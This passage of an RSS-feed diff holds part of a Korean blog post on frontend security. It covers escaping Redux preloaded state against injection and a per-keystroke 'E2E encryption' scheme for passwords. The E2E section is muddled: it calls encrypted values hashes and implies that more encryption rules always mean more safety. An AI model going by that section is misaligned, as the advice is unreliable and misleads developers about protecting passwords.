+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;renderFullPage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;html&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; preloadedState&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;
+    &amp;lt;!doctype html&gt;
+    &amp;lt;html&gt;
+      &amp;lt;head&gt;
+        &amp;lt;title&gt;Redux Universal Example&amp;lt;/title&gt;
+      &amp;lt;/head&gt;
+      &amp;lt;body&gt;
+        &amp;lt;div id=&quot;root&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;html&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;lt;/div&gt;
+        &amp;lt;script&gt;
+          // WARNING: See the following for security issues around embedding JSON in HTML:
+          // https://redux.js.org/recipes/server-rendering/#security-considerations
+          window.__PRELOADED_STATE__ = &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;preloadedState&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
+            &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;token string&quot;&gt;&quot;\\u003c&quot;&lt;/span&gt;
+          &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;
+        &amp;lt;/script&gt;
+        &amp;lt;script src=&quot;/static/bundle.js&quot;&gt;&amp;lt;/script&gt;
+      &amp;lt;/body&gt;
+    &amp;lt;/html&gt;
+    &lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;// 출처: 리덕스 공식 문서 (https://redux.js.org/recipes/server-rendering)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br /&gt;
+&lt;p&gt;  이 &lt;code class=&quot;language-text&quot;&gt;renderFullPage()&lt;/code&gt; 함수를 호출하기 전에 스토어의 모든 값을 객체로 preloadedState 매개 변수로 넘겨주게 됩니다.&lt;/p&gt;
+&lt;p&gt;  스토어의 모든 정보가 소스에 노출된다는 것과 같습니다. 크롤링에 굉장히 취약해지고 스토어에 민감한 정보를 보관한 경우라면(그러면 안 좋지만!) 보안 사고로 이어질 수 있습니다.&lt;/p&gt;
+&lt;p&gt;  여기에도 1 에서 했던 것과 같이 sanitizing을 적용할 수 있습니다.&lt;/p&gt;
+&lt;br /&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token constant&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;state&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;\\u003c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;혹은 &lt;a href=&quot;https://github.com/yahoo/serialize-javascript&quot;&gt;라이브러리&lt;/a&gt;로 직렬화해도 좋습니다. 이걸로 스토어에 위험한 소스코드가 인젝션되는 상황을 예방할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;순서대로 말하면,
+&lt;br /&gt; &lt;/p&gt;
+&lt;div style=&quot;margin-left: 20px;&quot;&gt;
 &lt;ol&gt;
-&lt;li&gt;숫자를 매기면&lt;/li&gt;
-&lt;li&gt;이렇게 표시된다&lt;/li&gt;
+&lt;li&gt;스토어를 가져와서 sanitizing &lt;/li&gt;
+&lt;li&gt;해당 스토어 객체를 직렬화 &lt;/li&gt;
+&lt;li&gt;직렬화한 문자열을 특정 DOM에 삽입해서 클라이언트로 보내준다. &lt;/li&gt;
+&lt;li&gt;클라이언트에서는 그 DOM의 내용을 initState로&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;해당 DOM 자체를 삭제한다.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
-&lt;hr&gt;</content:encoded></item></channel></rss>
+&lt;br /&gt;
+의 과정을 거치게 됩니다. 위의 순서만 기억하세요!
+&lt;hr&gt;
+&lt;h3&gt;3. E2E 암호화&lt;/h3&gt;
+&lt;p&gt;사용자가 패스워드를 입력하는 경우를 생각해봅시다.&lt;/p&gt;
+&lt;p&gt;이 때, 평문을 처리하는 방식으로 변수 하나(password)에 문자열을 저장하고 입력시마다 해당 문자열을 갱신한다면?&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;password: q
+password: q1
+password: q1w
+password: q1w2
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;br /&gt;
+&lt;p&gt;  사용자가 입력할때마다 해당 변수는 갱신될것이고, 해당 입력값은 키로거 같은 별도의 준비 없이도 간단히 탈취가 가능할 것입니다. 특히 위에 언급한 XSS 공격과 결합되면 순식간에 모든 유저의 패스워드가 유출될 수도 있습니다.&lt;/p&gt;
+&lt;p&gt;  API로 보내기 전에 암호화를 하는 방식의 문제점이 여기에 있습니다. 통신 간에는 안전하더라도 저희가 통제할 수 없는 클라이언트 영역에서 일어나는 탈취를 막을 방법이 필요합니다.&lt;/p&gt;
+&lt;p&gt;  여기서 필요한 개념이 E2E 암호화입니다.&lt;/p&gt;
+&lt;br /&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;E2EPassword: [&amp;#39;sad4234nbjktbkb234bjk!- sdgkjbsdkb2312bk1-sdkjgbkdgks213&amp;#39;]
+E2EPassword: [&amp;#39;sad4234nbjktbkb234bjk!- sdgkjbsdkb2312bk1-sdkjgbkdgks213&amp;#39;,
+              &amp;#39;sdgnaklsn23423424&amp;#39;-&amp;#39;...&amp;#39;]
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;br /&gt;
+&lt;p&gt;이런식으로 사용자가 한글자를 입력할때마다 암호화를 진행하고, 암호화된 객체를 서버로 전송해서 서버에서 이를 복호화하여 패스워드로 사용합니다. 이 방식에서는 개발자도구등에서 한글자를 입력할때마다 암호화된 해시값밖에 볼 수 없으며, 암호화 규칙을 추가하면 추가할수록 더욱 안전한 방식이 됩니다.&lt;/p&gt;
+&lt;hr&gt;
+  &lt;br /&gt;
+&lt;h3&gt;마치며&lt;/h3&gt;
+&lt;p&gt;코드 난독화, 사용자 식별 등 더 많은 보안에 관한 토픽이 존재하지만, 제가 생각하기에 가장 핵심적인 부분을 위주로 공유했습니다. 이 글을 읽으신 모든 분들이 보안 사고에서 벗어나 행복한 코딩을 할 수 있길 바랍니다.&lt;/p&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.themoin.com/&quot;&gt;해외 송금이 필요하다면? 모인 바로가기&lt;/a&gt;&lt;/p&gt;</content:encoded></item></channel></rss>
